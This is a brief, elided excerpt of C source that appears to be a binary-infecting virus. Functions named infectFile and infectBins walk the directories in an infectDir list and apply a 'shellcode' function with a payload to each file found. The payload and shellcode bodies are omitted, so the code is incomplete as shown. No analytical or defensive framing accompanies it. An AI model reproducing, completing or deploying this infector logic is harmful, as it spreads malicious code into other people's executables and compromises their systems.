...
static int  infectFile(const char *dirname, struct dirent *file, shellcode fun) {
  ...
  fun(dlsym, handle, &header, dirname, file->d_name, payload);
  dlclose(handle);
  return (0);
...
static int  infectBins(const char *dirname, shellcode fun) {
  DIR *dir;
  struct dirent *file;
...
int   main(void) {
  ...
  while (infectDir[i] != NULL) {
    if (infectBins(infectDir[i], fun) == -1)
      return (1);
    i += 1;
  }
  #ifdef DEBUG
